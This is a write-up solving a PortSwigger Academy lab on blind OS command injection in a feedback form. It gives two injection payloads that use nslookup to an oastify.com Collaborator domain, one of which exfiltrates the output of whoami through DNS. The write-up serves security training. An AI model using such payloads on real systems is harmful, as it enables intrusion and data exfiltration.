
# Blind OS command injection with out-of-band data exfiltration

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/os-command-injection



![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration/1.png)

---------------------------------------------

There is a function to submit feedback. It allows out-of-band interaction with the payload:

```
$(nslookup juh2fcq2cctj3nb1g8ecp69m6dc400op.oastify.com)
```



![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration/2.png)


We get the username ("peter-0B6BNY") using the payload:

```
$(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
```



![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration/3.png)



![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration/4.png)
